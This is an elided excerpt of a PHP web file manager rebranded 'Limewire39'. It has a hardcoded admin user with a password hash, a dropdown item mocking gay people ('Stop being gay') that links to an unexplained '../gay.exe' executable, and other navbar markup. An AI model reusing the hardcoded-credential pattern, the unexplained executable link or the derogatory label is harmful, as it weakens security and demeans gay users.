...
$auth_users = array(
    'pyro' => '$2y$10$Sl25FE1C3Vvff99I9Er6f.o/mWW/8.UxzYrg.IT.regXnwP9zq/YC'
);
...
function fm_show_nav_path($path)
{
    ...
    <nav class="navbar navbar-expand-lg <?php echo $getTheme; ?> mb-4 main-nav <?php echo $isStickyNavBar ?>">
        <a class="navbar-brand" href="pyronode.us/gay">File Manager </a>
                ...
                <ul class="navbar-nav mr-auto float-right <?php echo fm_get_theme();  ?>">
                    <li class="nav-item mr-2">
                        <div class="input-group input-group-sm mr-1" style="margin-top:4px;">
                            <input type="text" class="form-control" placeholder="Search" aria-label="Search" aria-describedby="search-addon2" id="search-addon"> <!--- <?php echo lng('Search') ?> --->
                            ...
                            <div class="input-group-append btn-group">
                                <span class="input-group-text dropdown-toggle" id="search-addon2" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></span>
                                  <div class="dropdown-menu dropdown-menu-right">
                                    ...
                                    <a class="dropdown-item" href="../gay.exe" >Stop being gay</a>
                                  </div>
                            </div>
                        </div>
                    </li>
                    ...
                    <li class="nav-item avatar dropdown">
                        ...
                        <div class="dropdown-menu dropdown-menu-right <?php echo fm_get_theme(); ?>" aria-labelledby="navbarDropdownMenuLink-5">
                            <?php if (!FM_READONLY): ?>
                            <a title="<?php echo lng('Settings') ?>" class="dropdown-item nav-link" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> Settings</a> <!--- <?php echo lng('Settings') ?> --->
                            <?php endif ?>
                            <a title="<?php echo lng('Help') ?>" class="dropdown-item nav-link" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;help=2"><i class="fa fa-exclamation-circle" aria-hidden="true"></i> Help</a> <!--- <?php echo lng('Help') ?> --->
                            <a title="<?php echo lng('Logout') ?>" class="dropdown-item nav-link" href="?logout=1"><i class="fa fa-sign-out" aria-hidden="true"></i> Logout</a> <!--- <?php echo lng('Logout') ?> --->
                        </div>
                    </li>
                    <?php else: ?>
                        <?php if (!FM_READONLY): ?>
...
function lng($txt) {
    ...
    // English Language
    $tr['en']['AppName']        = 'Limewire39';      $tr['en']['AppTitle']           = 'File Manager';
